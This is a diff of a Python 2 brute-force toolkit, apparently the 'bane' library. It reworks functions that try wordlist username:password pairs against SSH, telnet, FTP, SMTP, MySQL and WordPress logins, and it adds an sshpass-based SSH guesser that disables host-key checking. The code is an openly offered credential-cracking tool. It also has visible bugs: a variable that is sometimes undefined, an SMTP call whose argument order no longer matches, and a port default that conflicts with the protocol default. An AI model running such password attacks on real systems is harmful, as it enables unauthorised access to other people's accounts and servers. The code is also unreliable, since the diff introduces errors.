@@ -1,9 +1,9 @@
-import requests,random,smtplib,telnetlib,sys,os,hashlib,base64
+import requests,random,smtplib,telnetlib,sys,os,hashlib,base64,subprocess
 from ftplib import FTP
 from bane.payloads import *
-if (("linux" in sys.platform) and (os.path.isdir('/storage/emulated/0/')==True)):
- android=True
-if android==False:
+if os.path.isdir('/data/data/com.termux/')==True:
+    termux=True
+if termux==False:
  import paramiko
  from paramiko import SSHClient, AutoAddPolicy
  import pexpect
@@ -356,7 +356,7 @@ def adminpanel(u,logs=True,mapping=False,returning=False,ext='php',timeout=10,pr
        print'[-]Failed'
 
 '''
-def smtp(u, p=25,username='',password='',ehlo=True,helo=False,ttls=False):
+def smtp(u, username,password,p=25,ehlo=True,helo=False,ttls=False):
  try:
   s= smtplib.SMTP(u, p)
   if ehlo==True:
@@ -372,14 +372,14 @@ def smtp(u, p=25,username='',password='',ehlo=True,helo=False,ttls=False):
  except Exception as e:
   pass
  return False
-def telnet(u,p=23,username='',password='',prompt='$',timeout=5):
+def telnet(u,username,password,p=23,prompt='$',timeout=5):
  try:
   t = telnetlib.Telnet(u,p,timeout=timeout)
   while True:
    s=t.read_until(":",timeout=timeout)
-   if (('sername' in s) or ('ogin' in s)):
+   if (('user' in s.lower()) or ('login' in s.lower())):
     t.write(username + "\n")
-   elif ("assword" in s):
+   elif ("pass" in s.lower()):
     t.write(password + "\n")
     break
   c= t.read_until(prompt,timeout=timeout)
@@ -389,7 +389,7 @@ def telnet(u,p=23,username='',password='',prompt='$',timeout=5):
  except:
   pass
  return False
-def sshlin(u,p=22,username='',password='',timeout=7):
+def sshlin(u,username,password,p=22,timeout=7):
  p='ssh -p {} {}@{}'.format(p,username,u)
  try:
   child = pexpect.spawn(p)
@@ -402,9 +402,9 @@ def sshlin(u,p=22,username='',password='',timeout=7):
    c+= child.after
    if "yes/no" in c:
     child.send('yes\n')
-   elif (('ogin' in c) or ('user' in c.lower())):
+   elif (('login' in c.lower()) or ('user' in c.lower())):
     child.send(username+'\n')
-   elif "assword" in c:
+   elif "pass" in c.lower():
     child.send(password+'\n')
     break
   try:
@@ -412,19 +412,21 @@ def sshlin(u,p=22,username='',password='',timeout=7):
   except:
    pass
   c= child.before
+  child.close()
   for x in prompts:
    if x in c:
     return True
  except Exception as e:
   pass
  return False
-def sshwin(ip,username='',password='',p=22,timeout=5):
+def sshwin(ip,username,password,p=22,timeout=5):
  try:
   s = SSHClient()
   s.set_missing_host_key_policy(AutoAddPolicy())
   s.connect(ip, p,username=username, password=password,timeout=timeout)
   stdin, stdout, stderr = s.exec_command ("echo alawashere",timeout=timeout)
   r=stdout.read()
+  s.close()
   if "alawashere" in r:
    return True
  except Exception as e:
@@ -438,7 +440,19 @@ def ftpanon(ip,timeout=5):
   except Exception as e:
     pass
   return False
-def ftp(ip,username='',password='',timeout=5):
+def sshandro(u,username,password,timeout=5):
+ l="sshpass -p {} ssh -o ConnectTimeout={} -o StrictHostKeyChecking=no {}@{} echo 1; exit".format(password,timeout,username,u)
+ ssh = subprocess.Popen(l.split(),stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+ p= ssh.communicate()
+ try:
+   ssh.kill()
+ except:
+   pass
+ if p[0].strip()=='1':
+  return True
+ else:
+  return False
+def ftp(ip,username,password,timeout=5):
    try:
     i=False
     ftp = FTP(ip,timeout=timeout)
@@ -454,23 +468,19 @@ def mysql(u,username='root',password=''):
  except Exception as e:
   pass
  return False
-def hydra(u,proto="ssh",p=22,wl=[],logs=True,returning=False,mapping=False,timeout=5,ehlo=False,helo=True,ttls=False,proxy=None,proxies=None):
+def hydra(u,p=25,proto="ssh",wl=[],logs=True,returning=False,mapping=False,timeout=5,ehlo=False,helo=True,ttls=False,proxy=None,proxies=None):
  '''
    this function is similar to hydra tool to bruteforce attacks on different ports.
 
    proto: (set by default to: ssh) set the chosen protocol (ftp, ssh, telnet, smtp and mysql) and don't forget to set the port.
 '''
  o=''
- if (sys.platform == "win32") or( sys.platform == "win64"):
-   if proto=="ssh":
-    s=ssh2
-   elif proto=="telnet":
-    s=telnet2
- else:
-   if proto=="ssh":
-    s=ssh1
-   elif proto=="telnet":
-    s=telnet1
+ if proto=="ssh":
+  s=sshlin
+  if (sys.platform == "win32") or( sys.platform == "win64"):
+   s=sshwin
+  if termux==True:
+   s=sshandro
  if proto=="ftp":
   s=ftp
  if proto=="smtp":
@@ -479,8 +489,6 @@ def hydra(u,proto="ssh",p=22,wl=[],logs=True,returning=False,mapping=False,timeo
   s=mysql
  if proto=="wp":
   s=wpadmin
- if ((android==True) and (proto=='ssh')):
-  return o
  for x in wl:
   user=x.split(':')[0].strip()
   pwd=x.split(':')[1].strip()
@@ -489,17 +497,17 @@ def hydra(u,proto="ssh",p=22,wl=[],logs=True,returning=False,mapping=False,timeo
   if (proto=="mysql"):
    r=s(u,user,pwd)
   elif (proto=="ftp"):
-   r=s(u,username=user,password=pwd,timeout=timeout)
+   r=s(u,user,pwd,timeout=timeout)
   elif (proto=="wp"):
    if proxy:
     proxy=proxy
    if proxies:
     proxy=random.choice(proxies)
-   r=s(u,username=user,password=pwd,proxy=proxy,timeout=timeout)
+   r=s(u,user,pwd,proxy=proxy,timeout=timeout)
   elif (proto=="smtp"):
-   r=s(u,p,username=user,password=pwd,ehlo=ehlo,helo=helo,ttls=ttls)
+   r=s(u,p,user,pwd,ehlo=ehlo,helo=helo,ttls=ttls)
   else:
-   r=s(u,p,username=user,password=pwd,timeout=timeout)
+   r=s(u,user,pwd,timeout=timeout)
   if r==True:
    if logs==True:
     print("[+]Found!!!")
